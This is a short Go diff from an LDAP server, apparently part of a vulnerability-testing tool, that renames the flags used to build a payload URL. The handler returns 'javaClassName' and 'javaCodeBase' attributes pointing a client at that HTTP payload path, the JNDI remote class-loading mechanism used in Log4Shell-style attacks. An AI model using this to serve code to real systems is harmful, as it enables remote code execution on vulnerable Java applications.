@@ -75,7 +75,7 @@ func (s *LDAPServer) handleSearch(w ldap.ResponseWriter, m *ldap.Message) {
 		return
 	}
 
-	codeBase := fmt.Sprintf("%s://%s/api/tests/%s/payload/", *flagProto, *flagAddrHTTPExternal, id)
+	codeBase := fmt.Sprintf("%s://%s/api/tests/%s/payload/", *flagLDAPHTTPProto, *flagHTTPAddrExternal, id)
 	e := ldap.NewSearchResultEntry("")
 	e.AddAttribute("javaClassName", message.AttributeValue(className))
 	e.AddAttribute("javaCodeBase", message.AttributeValue(codeBase))
